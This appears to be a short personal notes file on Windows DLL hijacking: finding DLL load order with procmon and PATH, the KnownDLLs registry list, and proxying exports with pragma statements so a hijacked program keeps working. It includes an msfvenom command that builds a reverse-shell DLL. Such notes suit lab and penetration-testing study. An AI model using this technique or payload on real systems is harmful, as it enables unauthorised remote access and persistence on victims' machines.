# this is an example of how to understand what is going on for when you forget

# compile the dllFinder.c
x86_64-w64-mingw32-gcc-win32 dllFinder.c -o test.exe

# compile it to create the dll
x86_64-w64-mingw32-gcc-win32 dll.c -shared -o artilleryRed.dll

# now we have a way to see if a DLL is loaded or not by running test.exe in powershell
# start up procmon and turn on a filter for test.ext
procmon.exe -accept-eula
# Now you can visually see the DLL load order it looks like, which should be the same as:
echo %PATH%
# what isn't listed is the current working directory, which is also checked.
# powershell is:
$Env:Path

# there are certain DLLs you cannot hijack. They are listed in the registry
HKLM\System\CurrentControlSet\Control\Session Manager\KnownDLLs

# Now if you want to have a malicious dll, use msfvenom to create one if you want it easy
msfvenom -p windows/x64/shell_reverse_tcp LPORT=555 -f dll -o bad.dll
# However, if the dll is required to run more things, it will cause the OS/program to crash
# we need to do some dll proxying in order to make it work. https://samsclass.info/126/proj/PMA126.htm
# one way is to get dll export viewer
http://www.nirsoft.net/utils/dll_export_viewer.html
# Now dump all the functions from the dll
# then, you can add pragma statements to load all of those things it is doing into your code
python parser.py report.html > pragma.txt
# Now put all those pragma statements at he beginning of your code



